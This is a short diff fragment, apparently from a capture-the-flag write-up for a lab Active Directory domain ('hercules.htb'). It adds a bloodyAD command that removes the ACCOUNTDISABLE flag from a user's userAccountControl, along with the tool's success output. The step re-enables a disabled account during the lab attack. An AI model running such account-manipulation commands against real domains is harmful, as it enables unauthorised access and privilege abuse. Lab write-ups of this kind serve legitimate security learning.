@@ -1124,5 +1124,14 @@ Ill have a look at all the users in bloodhound
 
 
 
+```python
+bloodyAD --host dc.hercules.htb -d hercules.htb -k remove uac -f ACCOUNTDISABLE 'fernando.r'
+[+] ['ACCOUNTDISABLE'] property flags removed from fernando.r's userAccountControl
+```
+
+Ill re enable the account
+
+
+
 
 
